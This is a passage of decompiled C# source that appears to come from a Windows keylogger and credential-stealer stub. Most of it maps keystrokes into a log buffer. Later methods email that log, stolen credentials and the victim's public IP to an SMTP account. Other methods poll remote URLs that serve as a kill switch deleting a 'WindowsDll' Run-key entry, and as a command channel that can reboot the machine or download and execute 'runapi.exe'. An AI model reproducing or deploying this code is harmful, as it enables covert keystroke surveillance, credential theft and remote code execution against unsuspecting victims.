			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "!");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "@");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "#");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "$");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "%");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "^");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "&");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "(");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ")");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "O");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "<");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "_");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "{");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "}");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "|");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ":");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ">");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "~");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "'");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "9");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "0");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "a");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "b");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "c");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "d");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "e");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "f");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "g");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "h");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "i");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "j");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "k");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "l");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "m");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "n");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "o");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "p");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "r");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "s");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "t");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "u");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "v");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "w");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "x");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "!");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "@");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "#");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "$");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "%");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "^");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "&");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "(");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ")");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "O");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "Z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "<");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "_");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "{");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "}");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "|");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ":");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ">");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "~");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_0().set_Text(vmethod_0().get_Text().Remove(checked(vmethod_0().get_Text().Length - 1), 1));
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "*");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_0().set_Text(vmethod_0().get_Text() + "'");
			}
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_58, "true", false) == 0)
		{
			try
			{
				Class14.smethod_0();
				Class15.smethod_1();
				Class16.smethod_0();
				Class12.smethod_0();
				Class11.smethod_0();
				Class13.smethod_0();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				((TextBoxBase)vmethod_14()).AppendText("==== NOTHING TO STEAL ====\r\n");
				ProjectData.ClearProjectError();
			}
		}
		WebClient webClient = new WebClient();
		string @string = Encoding.ASCII.GetString(webClient.DownloadData("http://whatismyip.com/automation/n09230945.asp"));
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = ((ServerComputer)Class1.smethod_0()).get_Name() + ":";
			mailMessage.To.Add(string_11);
			mailMessage.From = new MailAddress(string_11);
			mailMessage.Body = "IP Address :" + @string + "\r\n===== Stealers =====\r\n" + vmethod_14().get_Text() + "\r\n===== Logs =====\r\n" + vmethod_0().get_Text();
			SmtpClient smtpClient = new SmtpClient(Conversions.ToString(object_5));
			smtpClient.Port = 587;
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(string_11, string_20);
			smtpClient.Send(mailMessage);
			((TextBoxBase)vmethod_0()).Clear();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_59, method_2(), false) != 0)
		{
			vmethod_0().set_Text(vmethod_0().get_Text() + "\r\n[" + method_2() + "]:\r\n");
			string_59 = method_2();
		}
	}

	private void method_6(object sender, EventArgs e)
	{
		try
		{
			WebClient webClient = new WebClient();
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(object_13) };
			bool[] array2 = new bool[1] { true };
			object obj = NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				object_13 = RuntimeHelpers.GetObjectValue(array[0]);
			}
			string text = Conversions.ToString(obj);
			if (text.Contains(Conversions.ToString(object_14)))
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WindowsDll");
				Application.Exit();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://divxdrivers.fileave.com/read14.txt");
			if (text.Contains("bejn666Stub"))
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("WindowsDll");
				Application.Exit();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_8(object sender, EventArgs e)
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString(string_13);
			if (Operators.ConditionalCompareObjectEqual(object_2, (object)"true", false) && text.Contains(string_14))
			{
				Process.Start("ShutDown", "/r");
			}
			if (Operators.ConditionalCompareObjectEqual(object_1, (object)"true", false) && text.Contains(string_16))
			{
				Process.Start(string_15);
			}
			if (Operators.ConditionalCompareObjectEqual(object_0, (object)"true", false) && text.Contains(string_18))
			{
				if (File.Exists(string_10 + "runapi.exe"))
				{
					FileSystem.Kill(string_10 + "runapi.exe");
					return;
				}
				((ServerComputer)Class1.smethod_0()).get_Network().DownloadFile(string_17, string_10 + "runapi.exe");
				vmethod_12().Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		Process.Start(string_10 + "runapi.exe");
		vmethod_12().Stop();
	}

	private void method_10(object sender, EventArgs e)
	{
